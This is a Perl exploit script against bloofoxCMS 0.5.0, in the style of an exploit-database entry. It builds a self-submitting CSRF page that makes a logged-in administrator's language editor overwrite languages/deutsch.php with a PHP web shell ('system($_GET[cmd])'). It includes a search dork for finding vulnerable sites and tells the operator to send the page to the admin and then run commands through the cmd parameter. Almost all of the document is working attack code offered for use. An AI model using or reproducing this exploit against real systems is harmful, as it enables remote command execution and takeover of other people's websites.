#!/usr/bin/perl
########################################################################
# Title    : bloofoxCMS V0.5.0 -  Csrf inject php code
#Author   : AtT4CKxT3rR0r1ST
# Contact  : [F.Hack@w.cn] , [AtT4CKxT3rR0r1ST@gmail.com]
# Home     : http://www.iphobos.com/blog/
# Script   : http://www.bloofox.com/download.21.html
# Version  : 0.5.0
# Dork     : "Powered by bloofoxCMS"
# Vulnerability In Languages Editor
# Note : Can Edit Any File Php In Script Just Change Value[Director/file]
In Fileurl
use LWP::UserAgent;
use LWP::Simple;
system("cls");
print "|----------------------------------------------------|\n";
print "|     bloofoxCMS V0.5.0 -  Csrf inject php code      |\n";
print "|           Coded by   : AtT4CKxT3rR0r1ST            |\n";
print "|               GREATS TO MY LOVE                    |\n";
print "|----------------------------------------------------|\n";
sleep(2);
print "\nInsert Target:";
$h = <STDIN>;
chomp $h;
$html = '<html>
<body onload="document.form0.submit();">
<form method="POST" name="form0"
action="'.$h.'/admin/index.php?mode=settings&page=editor">
<input type="hidden" name="file" value=" <?php system($_GET[cmd]); ?> "
<input type="hidden" name="fileurl" value="languages/deutsch.php"/>
<input type="hidden" name="fileurl" value="../languages/deutsch.php"/>
<input type="hidden" name="send" value="Save"/>
</form>
</body>
</html>';
sleep(1);
print "Createing Done ...\n";
open(XSS , '>>csrf.html');
print XSS $html;
close(XSS);
print "Now Send csrf.html To Admin \n";
sleep(1);
print "To Exploit [http://site/languages/deutsch.php?cmd= COMMAND] \n";
